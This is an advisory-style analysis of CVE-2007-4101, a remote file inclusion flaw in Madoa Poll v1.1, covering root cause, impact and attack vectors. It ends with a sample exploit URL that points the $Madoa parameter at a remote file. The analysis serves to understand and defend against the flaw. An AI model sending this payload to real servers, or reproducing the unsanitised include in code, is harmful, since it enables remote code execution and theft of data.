Based on the provided information, here's an analysis of CVE-2007-4101:

**Root Cause:**
The vulnerability stems from the insecure use of the `require` function in Madoa Poll v1.1. The application includes a file path constructed by concatenating a user-controlled variable `$Madoa` with the string `"config.php"`.

**Weaknesses/Vulnerabilities:**
- **Remote File Inclusion (RFI):** The primary vulnerability is a Remote File Inclusion (RFI) flaw. The application uses `require ($Madoa . "config.php");`, where the `$Madoa` variable can be manipulated by an attacker to include a remote file.
- **Lack of Input Sanitization:** The application fails to sanitize or validate the `$Madoa` variable, allowing the attacker to inject arbitrary URLs.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to complete compromise of the web application and potentially the server itself.
- **Data Theft:** An attacker could also potentially access or steal sensitive data stored within the application's environment.
- **Denial of Service:** In some scenarios, an attacker could cause a denial of service by including resource-intensive files.

**Attack Vectors:**
- **HTTP GET Request Parameter Manipulation:** The `$Madoa` variable is passed via HTTP GET parameters in vulnerable files such as `index.php`, `vote.php`, and `admin.php`. An attacker can simply modify the `Madoa` parameter in the URL to point to a malicious remote file.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the server hosting the vulnerable Madoa Poll v1.1 application.
- **Basic HTTP knowledge:** The attacker needs to know how to modify URLs.

**Technical Details:**
- The vulnerable code is located in `index.php`, `vote.php`, and `admin.php` (with a slight variation in admin.php) and involves using the `require` function with a user-controlled variable: `require ($Madoa . "config.php");`.
- The vulnerability is triggered by manipulating the `Madoa` GET parameter.
- An example exploit URL is `index.php?Madoa=http://sheel.txt?`.
